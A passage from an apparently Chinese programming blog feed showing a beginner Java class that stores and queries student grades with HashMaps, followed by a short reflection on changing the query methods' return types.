&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> name+<span class="string">&quot; &quot;</span>+temp.toString();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 通过课程名找到这一门课的全部学生的成绩</span></span><br><span class="line">	<span class="keyword">public</span> String <span class="title function_">getScore_subject</span><span class="params">(String subject)</span></span><br><span class="line">	&#123;</span><br><span class="line">		HashMap&lt;String, Double&gt; temp = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Double&gt;();</span><br><span class="line">		<span class="keyword">for</span> (String k : studentInfo.keySet())</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (studentInfo.get(k).containsKey(subject))</span><br><span class="line">			&#123;</span><br><span class="line">				temp.put(k, studentInfo.get(k).get(subject));</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> subject+<span class="string">&quot;:&quot;</span>+temp.toString();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 重载toString()方法</span></span><br><span class="line">	<span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line">		String temp=<span class="string">&quot;&quot;</span>;</span><br><span class="line">		<span class="keyword">for</span>(String k:studentInfo.keySet())</span><br><span class="line">			temp+=(k+<span class="string">&quot;:&quot;</span>+studentInfo.get(k).toString()+<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> temp;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">		<span class="type">Student_Grade</span> <span class="variable">student</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student_Grade</span>();</span><br><span class="line">		student.add(<span class="string">&quot;张三&quot;</span>, <span class="string">&quot;Java&quot;</span>, <span class="number">60.0</span>);</span><br><span class="line">		student.add(<span class="string">&quot;张三&quot;</span>, <span class="string">&quot;C++&quot;</span>, <span class="number">70.0</span>);</span><br><span class="line">		student.add(<span class="string">&quot;李四&quot;</span>, <span class="string">&quot;C++&quot;</span>, <span class="number">80.0</span>);</span><br><span class="line">		student.add(<span class="string">&quot;王五&quot;</span>, <span class="string">&quot;C++&quot;</span>, <span class="number">90.2</span>);</span><br><span class="line">		System.out.println(student.getScore_name(<span class="string">&quot;张三&quot;</span>));</span><br><span class="line">		System.out.println(student.getScore_subject(<span class="string">&quot;C++&quot;</span>));</span><br><span class="line">		System.out.println(student);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h2 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果:"></a>运行结果:</h2><p><img data-src="/images/20170821012136233.jpg"></p>
-<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>起初，两个查询的方法如下所示，返回值是一个Hasmap&lt;String,Doubole&gt;。</p>
-<p>后来在为Student_Grade写<code>toString（）</code>方法以便输出所有学生的所有成绩时，想到可以在两个查询的方法中临时建立一个String，调用<code>toString()</code>方法，赋值给它，并对该字符串进行处理，返回一个字符串。使得输出有”姓名“和”课程名“，信息更完整。（强迫症）</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 通过姓名找到这名学生的所有成绩</span></span><br><span class="line"><span class="keyword">public</span> HashMap&lt;String, Double&gt; <span class="title function_">getScore_name</span><span class="params">(String name)</span></span><br><span class="line">&#123;</span><br><span class="line">	HashMap&lt;String, Double&gt; temp = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Double&gt;();</span><br><span class="line">	<span class="keyword">for</span> (String k : studentInfo.keySet())</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (k == name)</span><br><span class="line">		&#123;</span><br><span class="line">			temp = studentInfo.get(name);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过课程名找到这一门课的全部学生的成绩</span></span><br><span class="line"><span class="keyword">public</span> HashMap&lt;String, Double&gt; <span class="title function_">getScore_subject</span><span class="params">(String subject)</span></span><br><span class="line">&#123;</span><br><span class="line">	HashMap&lt;String, Double&gt; temp = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Double&gt;();</span><br><span class="line">	<span class="keyword">for</span> (String k : studentInfo.keySet())</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (studentInfo.get(k).containsKey(subject))</span><br><span class="line">		&#123;</span><br><span class="line">			temp.put(k, studentInfo.get(k).get(subject));</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
       <categories>
         <category>面向对象程序设计_Java语言_翁恺</category>
       </categories>
